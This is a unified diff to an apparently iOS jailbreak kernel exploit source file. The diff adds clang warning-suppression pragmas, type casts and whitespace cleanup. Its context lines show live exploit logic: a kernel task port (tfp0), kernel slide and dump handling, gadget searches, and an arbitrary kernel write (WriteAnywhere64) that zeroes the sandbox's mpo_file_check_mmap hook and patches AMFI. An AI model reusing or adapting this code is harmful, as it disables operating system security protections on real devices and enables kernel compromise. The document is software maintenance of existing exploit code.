@@ -33,6 +33,12 @@
 
 #define vm_address_t mach_vm_address_t
 
+#pragma clang diagnostic push
+#pragma clang diagnostic ignored "-Wincompatible-pointer-types"
+#pragma clang diagnostic ignored "-Wint-conversion"
+#pragma clang diagnostic ignored "-Wshorten-64-to-32"
+#pragma clang diagnostic ignored "-Wpointer-sign"
+
 mach_port_t tfp0=0;
 uint64_t slide=0;
 io_connect_t funcconn=0;
@@ -191,7 +197,7 @@ void exploit(mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
         copyin(kdump+k*0x4000, min+k*0x4000, 0x4000);
     }
     
-    NSLog(@"kdump: %llx", kdump);
+    NSLog(@"kdump: %llx", (uint64_t)kdump);
     uint64_t kerndumpsize = 0;
     uint64_t gadget_base = 0;
     uint64_t gadget_size = 0;
@@ -590,7 +596,6 @@ remappage[remapcnt++] = (x & (~PMK));\
         
         if (streak == 9) {
             
-            
             char* sbstr = whole_dump + lastk + endf - whole_base - 8;
             
             uint64_t extract_attr_recipe = *(uint64_t*)(sbstr + 72 * 0x20 + 8 /*fptr*/);
@@ -657,7 +662,7 @@ remappage[remapcnt++] = (x & (~PMK));\
     {
         uint64_t endf = prelink_base+prelink_size;
         uint64_t ends = whole_size - (endf - whole_base);
-        char* sbstr = memmem(whole_dump + endf - whole_base, ends, "com.apple.System.boot-nonce", strlen("com.apple.System.boot-nonce"));
+        char* sbstr = memmem(whole_dump + endf - whole_base, (size_t)ends, "com.apple.System.boot-nonce", strlen("com.apple.System.boot-nonce"));
         
         if (sbstr) {
             
@@ -692,7 +697,6 @@ remappage[remapcnt++] = (x & (~PMK));\
     
     NSLog(@"amfistr at %llx", amfiops);
     
-    
     {
         /*
          amfi
@@ -709,7 +713,6 @@ remappage[remapcnt++] = (x & (~PMK));\
         }
         WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap)), 0);
     }
-    
     
     /*
      first str
@@ -962,3 +965,4 @@ void copy_bootstrap() {
 //
 //@end
 
+#pragma clang diagnostic pop
